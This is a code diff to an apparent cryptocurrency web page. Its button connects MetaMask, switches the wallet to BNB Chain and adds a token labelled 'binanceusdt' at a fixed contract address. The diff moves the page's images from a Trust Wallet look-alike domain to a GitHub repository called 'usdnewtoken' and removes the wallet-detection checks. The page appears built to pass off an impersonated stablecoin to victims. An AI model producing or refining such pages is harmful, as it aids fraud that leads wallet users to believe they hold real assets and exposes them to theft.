@@ -31,7 +31,9 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://www.trustwdu.com/m/click.png" onclick="addToken()" alt="Add Token">
+        <img src="https://raw.githubusercontent.com/usdnewtoken/us/main/t/click.png" 
+             onclick="addToken()" 
+             alt="Add Token">
     </div>
 
     <script>
@@ -59,23 +61,11 @@
                             },
                         ],
                     });
-                } else {
-                    console.error('Error switching to BNB Chain:', switchError);
                 }
             }
         }
 
         async function addToken() {
-            if (!window.ethereum) {
-                console.error('MetaMask is not installed. Please install MetaMask extension.');
-                return;
-            }
-
-            if (!window.ethereum.isMetaMask) {
-                console.error('Ethereum provider detected, but it is not MetaMask.');
-                return;
-            }
-
             try {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 await switchToBNBChain();
@@ -87,7 +77,7 @@
                             address: '0x1354A3156Dbc1C549239AB10491D7dD585790cfD',
                             symbol: 'binanceusdt',
                             decimals: 18,
-                            image: 'https://trustwdu.com/m/binance.png',
+                            image: 'https://raw.githubusercontent.com/usdnewtoken/us/main/t/binance.png',
                         },
                     },
                 });
